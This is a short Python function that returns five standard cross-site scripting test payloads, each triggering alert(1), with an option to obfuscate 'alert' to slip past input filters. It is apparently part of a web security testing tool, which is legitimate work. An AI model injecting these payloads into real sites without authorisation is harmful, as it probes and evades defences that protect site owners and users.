def generate_xss_payloads(obfuscate=False):
    base_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        "<body onload=alert(1)>"
    ]
    if obfuscate:
        base_payloads = [p.replace("alert", "a\\u006cert") for p in base_payloads]
    return base_payloads